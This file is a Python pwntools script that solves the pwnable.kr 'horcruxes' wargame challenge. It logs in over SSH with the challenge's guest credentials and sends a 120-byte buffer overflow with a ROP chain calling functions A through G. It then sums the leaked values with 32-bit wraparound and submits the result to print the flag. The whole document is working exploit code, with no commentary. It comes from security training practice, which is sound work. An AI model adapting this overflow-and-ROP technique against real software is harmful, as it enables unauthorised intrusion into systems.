#!/usr/bin/env python3
from pwn import *

context.update(arch = 'i386')
exe = './horcruxes'

elf = ELF(exe)
rop = ROP(elf)

ropme = 0x0809fffc
max_int32 = 0x7fffffff

p1 = ssh(user = 'horcruxes', host = 'pwnable.kr', port = 2222, password = 'guest')
p2 = p1.remote('localhost', 9032)

rop.call('A')
rop.call('B')
rop.call('C')
rop.call('D')
rop.call('E')
rop.call('F')
rop.call('G')

payload = [
    b'A' * 120,
    rop.chain(),
    p32(ropme)
]

p2.sendline(b'1')
p2.sendline(b''.join(payload))

data = p2.recvrepeat(1).decode().split('\n')
sum = 0
for line in data:
    exp = line.split('+')
    if len(exp) == 2:
        sum += int(exp[1][:-1])

sum %= 2 ** 32
if sum > max_int32:
    sum -= 2 ** 32

p2.sendline(b'1')
p2.sendline(str(sum).encode())

print(p2.recvline().decode().split(': ')[1])

p2.close()